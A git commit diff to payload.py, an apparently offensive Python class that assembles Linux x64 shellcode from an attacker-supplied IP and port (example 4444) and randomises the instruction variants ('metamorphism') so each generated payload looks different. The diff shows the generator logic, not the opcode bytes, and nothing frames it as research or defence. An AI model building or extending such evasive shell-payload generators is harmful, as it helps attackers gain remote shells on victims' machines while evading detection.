9a2579d0417f8e8c065f2a57e823d399fe5cb32b
Brucky <bouncebloc95@gmail.com>
2024-03-08 01:52:10 +0100

    cool stuffs

--- payload.py
+++ payload.py
@@ -1,11 +1,13 @@
-from opcodes import permut_list
+from opcodes import linux_x64
 from random import randint
 from utils import *
 
 class Payload:
     def __init__(self,platform,port,ip):
         """
-        Payload's constructor method from a platform (Windows/Linux), a port and an ip
+        Payload's constructor method from a platform (Windows/Linux), a port and an ip.
+
+        Example: Payload(platform="Linux",port=4444,ip=127.0.0.1)
         """
         self.shellcode = ""
         self.platform = platform
@@ -15,27 +17,33 @@ class Payload:
 
     def __str__(self):
         """
-        Return the ToString of the Payload object
+        ToString of the Payload object
         """
         return f"\nPlatform: {self.platform} {self.arch} - {self.get_bytes_size()} Bytes\nIP: {self.ip}\nPort: {self.port} \nShellcode:\n{self.shellcode}"
 
     def permut(self):
         """
-        
+        This method performs metamorphism on a shellcode.
+
+        Example: payload.permut()
         """
-        print(permut_list[20][0])
-        print(permut_list[17][0])
 
-        permut_list[20][0] = permut_list[20][0].replace(r"\x11\x5c", convert_port_to_hex(self.port)) # add port
-        permut_list[20][0] += convert_port_to_hex(self.port)
-        permut_list[17][0] += get_ip_and_mask(ip_to_hex(self.ip))[0]
-        permut_list[18][0] += get_ip_and_mask(ip_to_hex(self.ip))[1]
+        # Add port to the shellcode
+        linux_x64[20][0] += convert_port_to_hex(self.port) 
+        # Add masked IP address to the shellcode
+        linux_x64[17][0] += get_ip_and_mask(ip_to_hex(self.ip))[0]
+        # Add mask to the shellcode
+        linux_x64[18][0] += get_ip_and_mask(ip_to_hex(self.ip))[1]
 
-        print(permut_list[17][0])
-        
-        if self.platform == "Linux":
-            for line in permut_list:
+         # If the platform is Linux, select random lines from the shellcode arrays and append to self.shellcode
+        if self.platform == "Linux" and self.arch == "x64":
+            for line in linux_x64:
                     self.shellcode += line[randint(0,len(line)-1)]
 
     def get_bytes_size(self):
+        """
+        Bytes of the payload.
+
+        Example: payload.get_bytes_size()
+        """
         return self.shellcode.count(r"\x")
